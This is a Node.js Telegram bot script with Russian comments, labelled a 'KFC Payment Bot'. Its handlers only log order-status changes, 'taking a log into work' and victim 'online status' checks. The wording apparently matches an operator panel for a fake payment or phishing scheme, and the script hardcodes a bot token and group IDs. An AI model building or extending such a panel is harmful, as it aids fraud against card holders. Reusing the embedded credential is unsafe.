const { Telegraf } = require('telegraf');

// Конфигурация бота
const config = {
  bot: {
    token: '8091715985:AAF4vygWjtydtkzvjTN8TwyvethE46vptQA',
    logsGroupId: '-4938154910',
    loggingGroupId: '-1002986354571'
  }
};

const bot = new Telegraf(config.bot.token);

// Обработка ошибок
bot.catch((err, ctx) => {
  console.error('Telegram bot error:', err);
});

// Команда /start
bot.command('start', (ctx) => {
  ctx.reply('🤖 KFC Payment Bot активен!\n\nЭтот бот обрабатывает платежи для приложения KFC.');
});

// Команда /stats (простая версия без MongoDB)
bot.command('stats', (ctx) => {
  ctx.reply('📊 Статистика недоступна в локальном режиме.\nДля полной статистики используйте Railway.');
});

// Обработка обновлений статуса платежей
bot.action(/^log_(.+)_setStatus_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const status = ctx.match[2];
  
  console.log(`💳 Статус платежа обновлен: Заказ ${orderId} -> ${status}`);
  
  await ctx.answerCbQuery(`Статус обновлен: ${status}`);
});

// Обработка взятия лога в работу
bot.action(/^log_take_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`📝 Лог взят в работу: Заказ ${orderId}`);
  await ctx.answerCbQuery('Лог взят в работу');
});

// Обработка оставления лога
bot.action(/^log_(.+)_leave$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`📝 Лог оставлен: Заказ ${orderId}`);
  await ctx.answerCbQuery('Лог оставлен');
});

// Проверка онлайн статуса
bot.action(/^eye_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`👁️ Проверка онлайн статуса: Заказ ${orderId}`);
  await ctx.answerCbQuery('Проверяем онлайн статус');
});

// Запуск бота
bot.launch().then(() => {
  console.log('🤖 KFC Payment Bot запущен!');
  console.log('Токен:', config.bot.token.substring(0, 10) + '...');
  console.log('Logs Group ID:', config.bot.logsGroupId);
  console.log('Logging Group ID:', config.bot.loggingGroupId);
  console.log('⚠️  Работает в локальном режиме без MongoDB');
}).catch((error) => {
  console.error('Ошибка запуска бота:', error);
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
